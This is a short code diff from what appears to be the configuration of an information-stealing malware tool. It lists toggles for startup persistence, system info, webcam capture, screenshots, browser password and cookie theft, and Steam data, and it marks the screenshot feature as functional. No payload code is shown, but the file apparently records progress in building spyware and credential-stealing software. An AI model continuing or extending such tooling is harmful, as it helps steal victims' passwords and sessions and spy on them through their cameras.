@@ -2,7 +2,7 @@
 let runOnStartupToggle = false; //TODO
 let sysInfoToggle = true; //FUNCTIONAL
 let webcamToggle = true; //FUNCTIONAL
-let screenshotToggle = false; //VERIFY
+let screenshotToggle = false; //FUNCTIONAL
 let browserPassToggle = true; //FUNCTIONAL
 let browserCookieToggle = false; //TODO
 let steamToggle = false; //VERIFY
